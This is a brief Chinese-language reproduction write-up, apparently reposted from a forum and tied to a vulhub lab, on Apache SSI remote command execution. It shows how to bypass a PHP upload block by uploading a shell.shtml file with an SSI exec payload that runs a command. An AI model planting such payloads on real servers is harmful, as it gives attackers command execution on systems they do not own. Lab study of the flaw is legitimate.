# Apache SSI 远程命令执行漏洞

> 原文：[https://www.zhihuifly.com/t/topic/2829](https://www.zhihuifly.com/t/topic/2829)

# Apache SSI 远程命令执行漏洞

## 一、漏洞简介

在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用``语法执行任意命令。

## 二、漏洞影响

## 三、复现过程

正常上传PHP文件是不允许的，我们可以上传一个shell.shtml文件：

```
<!--#exec cmd="ls" --> 
```

![image](img/fb284c9068dd2fda5c65a0cb57777e35.png)

成功上传，然后访问shell.shtml，可见命令已成功执行：

![image](img/3c48e307426e92dca0f31b9391324b49.png)

## 参考链接

> https://vulhub.org/#/environments/httpd/ssi-rce/